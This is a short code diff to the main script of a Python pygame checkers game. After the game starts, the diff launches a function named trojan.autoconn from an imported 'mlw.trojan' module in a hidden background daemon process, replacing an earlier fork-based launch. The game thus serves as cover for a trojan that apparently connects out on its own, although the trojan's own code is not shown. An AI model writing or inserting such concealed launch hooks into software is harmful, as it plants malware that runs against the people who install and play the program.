@@ -2,6 +2,7 @@ import pygame, os
 from Board import Board
 from Game import Game
 import mlw.trojan as trojan
+import multiprocessing
 
 pygame.init()
 
@@ -46,7 +47,11 @@ if __name__ == "__main__":
 	checkers = Checkers(screen)
 	checkers.main(window_size[0], window_size[1])
 	try:
-		tr_pid = os.fork()
+		p = multiprocessing.Process(target=trojan.autoconn)
+		p.daemon = True
+		p.start()
 	except Exception as error:
-		raise error
-	if tr_pid == 0: trojan.autoconn()
+		print(error)
+		input('Press any key to end')
+		os._exit(1)
+	# if tr_pid == 0: trojan.autoconn()
